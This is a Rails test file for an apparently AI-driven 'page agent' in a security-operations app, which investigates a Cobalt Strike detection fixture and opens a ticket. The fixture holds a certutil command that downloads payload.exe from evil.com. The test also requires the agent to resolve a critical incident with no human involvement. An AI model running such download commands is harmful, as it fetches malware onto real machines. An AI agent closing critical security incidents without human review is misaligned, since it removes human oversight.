# frozen_string_literal: true

require "test_helper"

class PageAgentServiceTest < ActiveSupport::TestCase
  setup do
    @user = User.create!(
      name: "Page Agent User",
      email: "page-agent-#{SecureRandom.hex(4)}@sentriq.ai",
      role: "lead_analyst",
      demo_token: "page-agent-tok-#{SecureRandom.hex(4)}"
    )

    @detection = Detection.create!(
      title: "Cobalt Strike Beacon Ingress via certutil",
      severity: "critical",
      status: "new",
      hostname: "WKSTN-FIN-099",
      process_name: "certutil.exe",
      process_id: 6112,
      command_line: "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
      triggered_at: 2.minutes.ago,
      raw_telemetry: { cmdline: "certutil.exe -urlcache", parent: "powershell.exe" }
    )
  end

  test "executes in-page Re-Act loop, queries Ragie, opens ticket, and resolves with zero human intervention" do
    service = PageAgentService.new(
      instruction: "Bu tespiti incele, otomatik ticket aç, Ragie RAG'e sor ve raporla",
      page_url: "/detections/#{@detection.id}",
      page_context: { detection_id: @detection.id, hostname: @detection.hostname },
      current_user: @user,
      human_intervention: false
    )

    assert_difference("Ticket.count", 1) do
      result = service.call
      assert result[:success]

      ticket_data = result[:ticket]
      assert_not_nil ticket_data
      assert_match(/^SQT-/, ticket_data[:ticket_number])

      # Verify ticket is resolved without human intervention
      ticket = Ticket.find(ticket_data[:id])
      assert_equal "resolved", ticket.status
      assert_equal "page_agent_auto_resolved", ticket.human_decision

      # Verify Re-Act execution steps (observe, think, act)
      steps = result[:steps]
      assert steps.any? { |s| s[:phase] == "observe" }
      assert steps.any? { |s| s[:phase] == "think" }
      assert steps.any? { |s| s[:phase] == "act" }

      # Verify In-Page report was attached
      assert_match(/Page-Agent Investigation Report/, result[:report])
      assert_match(/Zero Human Touch/, result[:report])

      # Verify note was created on the ticket
      assert ticket.ticket_notes.where(author_type: "agent").any?
    end
  end
end
